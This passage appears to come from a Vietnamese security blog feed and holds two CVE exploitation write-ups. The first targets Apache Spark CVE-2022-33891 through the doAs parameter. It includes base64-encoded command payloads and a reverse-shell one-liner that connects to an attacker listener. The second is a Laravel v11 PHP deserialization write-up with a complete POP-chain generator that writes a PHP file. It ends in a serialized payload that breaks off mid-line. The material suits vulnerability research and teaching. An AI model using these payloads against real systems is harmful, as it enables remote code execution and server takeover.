+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">val</span> <span style="color:#a6e22e">cmdSeq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Seq</span>(<span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;id -Gn &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">username</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// we need to get rid of the trailing &#34;\n&#34; from the result of command execution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">cmdSeq</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>           
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">idPath</span> <span style="color:#f92672">::</span>  <span style="color:#e6db74">&#34;-Gn&#34;</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">Nil</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Hacker có thể khai thác bằng cách thiết lập một lệnh bash shell trong tham số <code>?doAs</code>
+<code>http://&lt;spark-ip&gt;:8080/?doAs={OS_command}</code>
+Tham số <code>doAs</code> trong Apache Spark cho phép người dùng chạy một lệnh với tư cách là người dùng khác. Tham số này có thể được sử dụng để cấp cho người dùng các quyền đặc biệt, chẳng hạn như quyền truy cập vào các tài nguyên hệ thống hoặc dữ liệu nhạy cảm.
+Các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng CVE-2022-33891 thông qua Apache Spark UI, gửi một reverse shell lên server và RCE.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Vào trong máy ảo docker và chỉnh sửa file <code>conf/spark-defaults.conf</code> bằng dòng lệnh:
+<code>echo &quot;spark.acls.enable true&quot; &gt;&gt; conf/spark-defaults.conf</code></p>
+<p></p>
+<p><strong>Bước 2:</strong> Đây là giao diện chính của Spark Master.</p>
+<p></p>
+<p><strong>Bước 3:</strong> Ta thử lần lượt từng payload.</p>
+<p><code>echo &quot;d2hvYW1p&quot; | base64 -d | bash</code> (tương đương với <code>whoami</code>)
+<code>echo &quot;c2xlZXAgMTAK&quot; | base64 -d | bash</code> (tương đương với <code>sleep 10</code>)</p>
+<p></p>
+<p>Nhận thấy các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<p><strong>Bước 4:</strong> Tiến hành khai thác bằng PHP reverse shell.</p>
+<p>Mở một port trên máy attacker bằng lệnh <code>ncat -nvlp 9001</code></p>
+<p></p>
+<p>Tiến hành reverse với dòng lệnh:
+<code>echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjM5LzkwMDEgMD4mMQ==&quot; | base64 -d | bash</code> (tương đương với <code>sh -i &gt;&amp; /dev/tcp/192.168.1.39/9001 0&gt;&amp;1</code>)</p>
+<p></p>
+<p><strong>Bước 5:</strong> Reverse thành công.</p>
+<p></p>
+<p><strong>Bước 6:</strong> Khai thác thành công.</p>
+<p></p>
+<p><strong>Video demo</strong></p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/aF7NSABWU2Q?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+]]></description>
+</item>
+<item>
+    <title>CVE-2024-40075</title>
+    <link>https://g03m0n.github.io/posts/cve-2024-40075/cve-2024-40075/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2024-40075/cve-2024-40075/</guid>
+    <description><![CDATA[<h1 id="cve-2024-40075-php-insecure-deserialization-at-laravel-v11x">CVE-2024-40075 PHP Insecure Deserialization at Laravel v11.x</h1>
+<ol>
+<li>
+<p><strong>Description and Impact</strong>
+Laravel là một framework ứng dụng web mã nguồn mở được viết bằng PHP. Do phương thức <code>__destruct</code> của lớp <code>Monolog\Handler\Handler</code> gọi phương thức <code>close</code>, <code>GroupHandler</code> đã ghi đè phương thức này và gọi phương thức <code>close</code> của mỗi handler. Khi deserialize các đối tượng độc hại, phương thức <code>getStreamName</code> sẽ gọi phương thức <code>__toString</code> của đối tượng đó. Kẻ tấn công có thể lợi dụng những phương thức có sẵn tồn tại trong ứng dụng để tạo ra chuỗi khai thác dựa trên Laravel và thực thi mã tùy ý.</p>
+<p>Version affected: <strong>v11.x</strong></p>
+</li>
+<li>
+<p><strong>Root cause analysis</strong></p>
+<p>Gadget chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Monolog\Handler\Handler</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">__destruct</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Monolog\Handler\GroupHandler</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">close</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Psy\Readline\Hoa\Stream</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">close</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">md5</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\Components\Element</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">__toString</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\Components\Element</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">toString</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\ValueObjects\Styles</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">format</span>()
+</span></span></code></pre></div><p></p>
+<p><code>Monolog/Handler/Handler.php</code></p>
+<p></p>
+<p>Gadget đầu tiên chính là phương thức <code>__destruct()</code> của lớp <code>Monolog\Handler\Handler</code>. Vì đây là một Abtract class nên ta cần phải tìm lớp kế thừa của nó để khởi tạo Object → khởi tạo class <code>GroupHandler</code>.</p>
+<p></p>
+<p>Khi Object <code>GroupHandler</code> bị hủy, nó sẽ gọi đến magic method <code>__destruct()</code> của lớp cha, trong <code>__destruct()</code> lại gọi đến <code>$this-&gt;close()</code>. Vì đã khởi tạo lớp <code>GroupHandler</code>, nên sẽ gọi đến phương thức <code>close()</code> của lớp <code>GroupHandler</code>.</p>
+<p><code>Monolog/Handler/GroupHandler.php</code></p>
+<p></p>
+<p>Tại đây, vì <code>$this-&gt;handlers</code> có thể kiểm soát được, nên có thể truyền vào payload để khi ứng dụng gọi đến <code>$handler-&gt;close()</code> sẽ trigger được đến phương thức <code>close()</code> của class <code>Readline\Hoa\Stream</code></p>
+<p>Vì <code>Stream</code> là Abstract class, nên cần một class khác thực hiện, ở đây sử dụng <code>FileRead</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handlers</span> <span style="color:#f92672">=</span> $oa; <span style="color:#75715e">// Với $oa = Psy\Readline\Hoa\FileRead
+</span></span></span></code></pre></div><p></p>
+<p><code>ReadLine/Hoa/Stream.php</code></p>
+<p></p>
+<p>Tiếp theo, ứng dụng gọi đến <code>$this-&gt;getStreamName()</code> sau đó gán vào biến <code>$streamName</code>, khi thực thi <code>md5()</code> bên dưới, nếu giá trị của <code>$streamName</code> là một đối tượng, nó sẽ gọi đến magic method <code>__toString()</code> của đối tượng đó.</p>
+<p>Đi vào <code>getStreamName()</code>:</p>
+<p></p>
+<p>Vì <code>Termwind\Components\Element</code> là một Abstract class, nên để gọi đến <code>Element</code> ta cần gọi đến lớp <code>Hr</code> là lớp kế thừa của nó. Ở đây ta cần khởi tạo <code>$this-&gt;_bucket = Termwind\Components\Hr</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> $oa <span style="color:#75715e">// Với $oa = Termwind\Components\Hr
+</span></span></span></code></pre></div><p></p>
+<p>Trigger được đến <code>__tostring()</code> của class <code>Element</code>:</p>
+<p></p>
+<p>Sau đó ứng dụng tiếp tục gọi đến <code>toString()</code>:</p>
+<p></p>
+<p>Trong phương thức này cần gán <code>$this-&gt;styles = Termwind\ValueObjects\Styles</code> để gọi đến phương thức <code>format()</code> của đối tượng này với tham số là <code>$this-&gt;content</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">styles</span> <span style="color:#f92672">=</span> $oa <span style="color:#75715e">// Với $oa = Termwind\ValueObjects\Styles
+</span></span></span></code></pre></div><p></p>
+<p>F7 đi vào phương thức <code>format()</code> của class <code>Styles</code>:</p>
+<p></p>
+<p>Trong vòng lặp <code>foreach</code> giá trị của <code>$modifier</code> có thể kiểm soát được, vì vậy có thể gọi <code>file_put_contents</code> để ghi nội dung vào file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">textModifiers</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;file_put_contents&#34;</span>]; 
+</span></span><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">properties</span> <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>		[
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;styles&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34; *&lt;?php*  phpinfo **();** *?&gt;* &#34;</span>, 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;parentStyles&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>		];
+</span></span></code></pre></div><p><strong>Stack trace</strong>:</p>
+<p></p>
+</li>
+<li>
+<p><strong>Steps to reproduce</strong></p>
+<p>Set up environment</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">composer</span> <span style="color:#a6e22e">create</span><span style="color:#f92672">-</span><span style="color:#a6e22e">project</span> <span style="color:#a6e22e">laravel</span><span style="color:#f92672">/</span><span style="color:#a6e22e">laravel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;11.1.1&#34;</span> <span style="color:#a6e22e">App</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">artisan</span> <span style="color:#a6e22e">make</span><span style="color:#f92672">:</span><span style="color:#a6e22e">controller</span> <span style="color:#a6e22e">UnserializeController</span>
+</span></span></code></pre></div><p><code>app/http/Controllers/UnserializeController.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">App\Http\Controllers</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Illuminate\Http\Request</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UnserializeController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Controller</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unserializeData</span>(<span style="color:#a6e22e">Request</span> $request)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $serializedData <span style="color:#f92672">=</span> $request<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">serialized_data</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        dd($serializedData);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Unserialize dữ liệu
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($serializedData));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//            dd($data);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($data <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">json</span>([
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;success&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;data&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Successfully&#34;</span>
+</span></span><span style="display:flex;"><span>                ]);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Exception</span>(<span style="color:#e6db74">&#39;Unable to unserialize data&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">\Exception</span> $e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">json</span>([
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;success&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;message&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Error unserializing data&#39;</span>
+</span></span><span style="display:flex;"><span>            ], <span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>resources/views/welcom.blade.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Document</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{url(&#39;unserialize-data&#39;)}}&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#f92672">@</span><span style="color:#a6e22e">csrf</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;serialized_data&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p><code>routes/web.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Illuminate\Support\Facades\Route</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Route</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">view</span>(<span style="color:#e6db74">&#39;welcome&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Route</span><span style="color:#f92672">::</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/unserialize-data&#39;</span>, [<span style="color:#a6e22e">App\Http\Controllers\UnserializeController</span><span style="color:#f92672">::</span><span style="color:#a6e22e">class</span>, <span style="color:#e6db74">&#39;unserializeData&#39;</span>]);
+</span></span></code></pre></div><p><strong>Exploit</strong></p>
+<p>Pop-chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Monolog\Handler</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GroupHandler</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">array</span> $handlers;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handlers</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Psy\Readline\Hoa</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileRead</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $_bucket <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Termwind\Components</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Termwind\ValueObjects\Styles</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hr</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Element</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">styles</span> <span style="color:#f92672">=</span> $oa;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abc.php&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Element</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">array</span> $defaultStyles <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">Styles</span> $styles;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">array</span><span style="color:#f92672">|</span><span style="color:#a6e22e">string</span> $content;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Termwind\ValueObjects</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Styles</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">array</span> $textModifiers <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;file_put_contents&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">array</span> $properties <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;styles&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;parentStyles&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span>{
+</span></span><span style="display:flex;"><span>    $styles <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Termwind\ValueObjects\Styles</span>;
+</span></span><span style="display:flex;"><span>    $hr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Termwind\Components\Hr</span>($styles);
+</span></span><span style="display:flex;"><span>    $o2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Psy\Readline\Hoa\FileRead</span>($hr);
+</span></span><span style="display:flex;"><span>    $o3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Monolog\Handler\GroupHandler</span>($o2);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o3));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Monolog</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHandler</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CGroupHandler</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A11</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">handlers</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span 